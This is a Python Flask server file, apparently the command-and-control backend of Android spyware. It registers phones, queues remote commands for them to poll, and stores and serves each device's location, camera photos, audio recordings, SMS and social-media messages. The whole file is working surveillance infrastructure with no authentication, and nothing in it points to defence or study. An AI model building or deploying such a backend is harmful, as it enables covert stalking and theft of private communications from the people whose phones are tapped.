from flask import Flask, request, jsonify
from datetime import datetime
import json
import os
import uuid
import sqlite3

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "tracker.db")

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    
    tables = [
        '''CREATE TABLE IF NOT EXISTS devices (
            id TEXT PRIMARY KEY, model TEXT, android_version TEXT,
            ip TEXT, features TEXT, last_seen TEXT, online INTEGER DEFAULT 1)''',
        '''CREATE TABLE IF NOT EXISTS locations (
            id INTEGER PRIMARY KEY, device_id TEXT, lat REAL, lon REAL,
            accuracy REAL, timestamp TEXT)''',
        '''CREATE TABLE IF NOT EXISTS photos (
            id INTEGER PRIMARY KEY, device_id TEXT, image_base64 TEXT,
            camera_type TEXT, timestamp TEXT)''',
        '''CREATE TABLE IF NOT EXISTS audio (
            id INTEGER PRIMARY KEY, device_id TEXT, audio_base64 TEXT,
            duration INTEGER, timestamp TEXT)''',
        '''CREATE TABLE IF NOT EXISTS sms (
            id INTEGER PRIMARY KEY, device_id TEXT, address TEXT,
            body TEXT, date TEXT, type TEXT, timestamp TEXT)''',
        '''CREATE TABLE IF NOT EXISTS social_media (
            id INTEGER PRIMARY KEY, device_id TEXT, app_name TEXT,
            sender TEXT, message TEXT, timestamp TEXT)''',
        '''CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY, device_id TEXT, command_type TEXT,
            params TEXT, status TEXT DEFAULT 'pending', created_at TEXT)'''
    ]
    
    for table in tables:
        c.execute(table)
    conn.commit()
    conn.close()

init_db()

@app.route('/api/device/register', methods=['POST'])
def register_device():
    data = request.get_json()
    device_id = data.get('device_id', str(uuid.uuid4()))
    
    conn = get_db()
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO devices 
        (id, model, android_version, ip, features, last_seen, online)
        VALUES (?, ?, ?, ?, ?, ?, ?)''',
        (device_id, data.get('model'), data.get('android_version'),
         request.remote_addr, json.dumps(data.get('features', [])),
         datetime.now().isoformat(), 1))
    conn.commit()
    conn.close()
    
    return jsonify({
        "status": "registered",
        "device_id": device_id,
        "server_time": datetime.now().isoformat()
    })

@app.route('/api/device/<device_id>/command', methods=['POST'])
def queue_command(device_id):
    data = request.get_json()
    conn = get_db()
    c = conn.cursor()
    c.execute('''INSERT INTO commands (device_id, command_type, params, created_at)
                 VALUES (?, ?, ?, ?)''',
              (device_id, data.get('type'), json.dumps(data.get('params', {})),
               datetime.now().isoformat()))
    conn.commit()
    cmd_id = c.lastrowid
    conn.close()
    return jsonify({"status": "queued", "command_id": cmd_id})

@app.route('/api/device/<device_id>/poll', methods=['GET'])
def poll_commands(device_id):
    conn = get_db()
    c = conn.cursor()
    
    c.execute('''SELECT id, command_type, params FROM commands 
                 WHERE device_id = ? AND status = 'pending'
                 ORDER BY created_at ASC''', (device_id,))
    
    commands = [{"id": r[0], "type": r[1], "params": json.loads(r[2])} 
                for r in c.fetchall()]
    
    if commands:
        c.execute('''UPDATE commands SET status = 'delivered' 
                     WHERE device_id = ? AND status = 'pending' ''', (device_id,))
    
    c.execute('''UPDATE devices SET last_seen = ?, online = 1 WHERE id = ?''',
              (datetime.now().isoformat(), device_id))
    
    conn.commit()
    conn.close()
    return jsonify({"commands": commands})

@app.route('/api/device/<device_id>/data', methods=['POST'])
def receive_data(device_id):
    data = request.get_json()
    data_type = data.get('type')
    conn = get_db()
    c = conn.cursor()
    
    if data_type == 'location':
        d = data.get('data', {})
        c.execute('''INSERT INTO locations (device_id, lat, lon, accuracy, timestamp)
                     VALUES (?, ?, ?, ?, ?)''',
                  (device_id, d.get('lat'), d.get('lon'), d.get('accuracy'),
                   datetime.now().isoformat()))
    
    elif data_type == 'photo':
        d = data.get('data', {})
        c.execute('''INSERT INTO photos (device_id, image_base64, camera_type, timestamp)
                     VALUES (?, ?, ?, ?)''',
                  (device_id, d.get('image'), d.get('camera', 'unknown'),
                   datetime.now().isoformat()))
    
    elif data_type == 'audio':
        d = data.get('data', {})
        c.execute('''INSERT INTO audio (device_id, audio_base64, duration, timestamp)
                     VALUES (?, ?, ?, ?)''',
                  (device_id, d.get('audio'), d.get('duration', 0),
                   datetime.now().isoformat()))
    
    elif data_type == 'sms':
        d = data.get('data', {})
        c.execute('''INSERT INTO sms (device_id, address, body, date, type, timestamp)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (device_id, d.get('address'), d.get('body'), d.get('date'),
                   d.get('type'), datetime.now().isoformat()))
    
    elif data_type == 'social_media':
        d = data.get('data', {})
        c.execute('''INSERT INTO social_media (device_id, app_name, sender, message, timestamp)
                     VALUES (?, ?, ?, ?, ?)''',
                  (device_id, d.get('app'), d.get('sender'), d.get('message'),
                   datetime.now().isoformat()))
    
    conn.commit()
    conn.close()
    return jsonify({"status": "received"})

@app.route('/api/devices', methods=['GET'])
def get_devices():
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT id, model, features, last_seen, online FROM devices''')
    devices = [{
        "id": r[0], "model": r[1],
        "features": json.loads(r[2]) if r[2] else [],
        "last_seen": r[3], "online": bool(r[4])
    } for r in c.fetchall()]
    conn.close()
    return jsonify({"devices": devices})

@app.route('/api/device/<device_id>/location', methods=['GET'])
def get_location(device_id):
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT lat, lon, accuracy, timestamp FROM locations 
                 WHERE device_id = ? ORDER BY timestamp DESC LIMIT 1''', (device_id,))
    row = c.fetchone()
    conn.close()
    if row:
        return jsonify({"found": True, "lat": row[0], "lon": row[1],
                       "accuracy": row[2], "timestamp": row[3]})
    return jsonify({"found": False})

@app.route('/api/device/<device_id>/photos', methods=['GET'])
def get_photos(device_id):
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT image_base64, camera_type, timestamp FROM photos 
                 WHERE device_id = ? ORDER BY timestamp DESC''', (device_id,))
    photos = [{"image": r[0], "camera": r[1], "timestamp": r[2]} 
              for r in c.fetchall()]
    conn.close()
    return jsonify({"photos": photos})

@app.route('/api/device/<device_id>/sms', methods=['GET'])
def get_sms(device_id):
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT address, body, date, type FROM sms 
                 WHERE device_id = ? ORDER BY date DESC''', (device_id,))
    messages = [{"address": r[0], "body": r[1], "date": r[2], "type": r[3]} 
                for r in c.fetchall()]
    conn.close()
    return jsonify({"sms": messages})

@app.route('/api/device/<device_id>/social', methods=['GET'])
def get_social(device_id):
    conn = get_db()
    c = conn.cursor()
    c.execute('''SELECT app_name, sender, message, timestamp FROM social_media 
                 WHERE device_id = ? ORDER BY timestamp DESC''', (device_id,))
    messages = [{"app": r[0], "sender": r[1], "message": r[2], "timestamp": r[3]} 
                for r in c.fetchall()]
    conn.close()
    return jsonify({"social": messages})

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({"status": "running", "time": datetime.now().isoformat(), "version": "2.0.0"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
